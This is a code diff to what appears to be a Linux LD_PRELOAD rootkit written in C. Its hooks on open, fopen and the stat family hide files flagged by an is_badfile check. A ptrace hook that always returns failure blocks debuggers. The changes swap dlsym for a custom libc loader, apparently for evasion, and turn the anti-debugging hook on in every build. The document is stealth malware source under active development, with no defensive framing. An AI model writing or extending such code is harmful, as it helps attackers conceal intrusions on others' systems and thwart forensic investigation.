@@ -127,7 +127,7 @@ struct dirent *readdir(DIR *dirp)
  */
 int open(const char *pathname, int flags, mode_t mode){
     #ifdef DEBUG
-    printf("[-] hooking open\n");
+    printf("[-] hooking open %s\n", pathname);
     #endif
 
     if(!hooked_open){
@@ -172,7 +172,7 @@ int open(const char *pathname, int flags, mode_t mode){
 FILE *fopen(const char *pathname, const char *mode)
 {
     #ifdef DEBUG
-    printf("[-] hooking fopen\n");
+    printf("[-] hooking fopen %s\n", pathname);
     #endif
 
     if(!hooked_fopen){
@@ -210,7 +210,7 @@ FILE *fopen(const char *pathname, const char *mode)
 FILE *fopen64(const char *pathname, const char *mode)
 {
     #ifdef DEBUG
-    printf("[-] hooking fopen64\n");
+    printf("[-] hooking fopen64 %s\n", pathname);
     #endif
 
     if(!hooked_fopen64){
@@ -418,7 +418,7 @@ int __xstat(int version, const char *path, struct stat *buf)
     printf("[-] hooking xstat %s\n", path);
     #endif
     if ( hooked_xstat == NULL ) {
-        hooked_xstat = dlsym(RTLD_NEXT, "__xstat");
+        hooked_xstat = load_libc("__xstat");
     }
 
     if (is_badfile(path)){
@@ -442,7 +442,7 @@ int __xstat64(int version, const char *path, struct stat64 *buf)
     printf("[-] hooking xstat64 %s\n", path);
     #endif
     if ( hooked_xstat64 == NULL ) {
-        hooked_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
+        hooked_xstat64 = load_libc("__xstat64");
     }
 
     if (is_badfile(path)){
@@ -466,7 +466,7 @@ int __lxstat(int version, const char *path, struct stat *buf)
     printf("[-] hooking lxstat %s\n", path);
     #endif
     if ( hooked_lxstat == NULL ) {
-        hooked_lxstat = dlsym(RTLD_NEXT, "__lxstat");
+        hooked_lxstat = load_libc("__lxstat");
     }
 
     if (is_badfile(path)){
@@ -490,7 +490,7 @@ int __lxstat64(int version, const char *path, struct stat64 *buf)
     printf("[-] hooking lxstat64 %s\n", path);
     #endif
     if ( hooked_lxstat64 == NULL ) {
-        hooked_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
+        hooked_lxstat64 = load_libc("__lxstat64");
     }
 
     if (is_badfile(path)){
@@ -499,10 +499,12 @@ int __lxstat64(int version, const char *path, struct stat64 *buf)
     return hooked_lxstat64(version, path, buf);
 } 
 
-#ifndef DEBUG
+// #ifndef DEBUG
 long ptrace(enum __ptrace_request request, ...){
+    #ifdef DEBUG
     printf("[-] hooking ptrace\n");
+    #endif
     errno = ESRCH;
     return -1;
 }
-#endif
+// #endif
